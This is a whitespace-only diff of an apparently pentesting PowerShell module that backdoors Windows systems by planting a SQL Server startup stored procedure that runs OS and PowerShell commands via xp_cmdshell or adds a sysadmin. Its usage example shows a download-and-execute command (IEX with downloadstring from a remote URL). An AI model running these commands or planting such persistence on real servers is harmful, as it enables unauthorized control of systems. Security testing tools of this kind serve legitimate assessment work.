@@ -3,16 +3,16 @@ function Invoke-SqlServer-Persist-AutrunSp
     <#
 	.SYNOPSIS
 	This script can be used backdoor a Windows system using a SQL Server startup stored procedure.
-    This is done marking a user defined stored procedure to run when the SQL Server is restarted 
-    using the native sp_procoption stored procedure. Note: This script requires sysadmin privileges.
+	This is done marking a user defined stored procedure to run when the SQL Server is restarted 
+	using the native sp_procoption stored procedure. Note: This script requires sysadmin privileges.
 
 	.DESCRIPTION
 	This script can be used backdoor a Windows system using a SQL Server startup stored procedure.
-    This is done marking a user defined stored procedure to run when the SQL Server is restarted 
-    using the native sp_procoption stored procedure. This script supports the executing operating system 
-    and PowerShell commands as the SQL Server service account using the native xp_cmdshell stored procedure. 
-    The script also support add a new sysadmin. This script can be run as the current Windows user or a 
-    SQL Server login can be provided. Note: This script requires sysadmin privileges.
+	This is done marking a user defined stored procedure to run when the SQL Server is restarted 
+	using the native sp_procoption stored procedure. This script supports the executing operating system 
+	and PowerShell commands as the SQL Server service account using the native xp_cmdshell stored procedure. 
+	The script also support add a new sysadmin. This script can be run as the current Windows user or a 
+	SQL Server login can be provided. Note: This script requires sysadmin privileges.
 
 	.EXAMPLE
 	Create startup stored procedure to add a new sysadmin.  The example shows the script being run using a SQL Login.
@@ -32,13 +32,13 @@ function Invoke-SqlServer-Persist-AutrunSp
 	PS C:\> Invoke-SqlServer-Backdoor-AutrunSp -Verbose -SqlServerInstance "SERVERNAME\INSTANCENAME" -PsCommand "IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/nullbind/Powershellery/master/Brainstorming/helloworld.ps1')"
 
 	.LINK
-	   http://www.netspi.com
-	   http://msdn.microsoft.com/en-us/library/ms178640.aspx
+	http://www.netspi.com
+	http://msdn.microsoft.com/en-us/library/ms178640.aspx
 
 	.NOTES
-	   Author: Scott Sutherland - 2014, NetSPI
-	   Version: Invoke-SqlServer-Backdoor-AutrunSp.psm1 v1.0
-	   Comments: 
+	Author: Scott Sutherland - 2014, NetSPI
+	Version: Invoke-SqlServer-Backdoor-AutrunSp.psm1 v1.0
+	Comments: 
         - This should work on SQL Server 2005 and Above.
         - The added procedures can be manually viewed using the query below.
             SELECT ROUTINE_NAME, ROUTINE_DEFINITION
@@ -443,7 +443,7 @@ function Invoke-SqlServer-Persist-AutrunSp
         
         # Close db connection
         $conn.Close()       
-                         
+
         # ---------------------------
         # Mark procedure for startup
         # ---------------------------
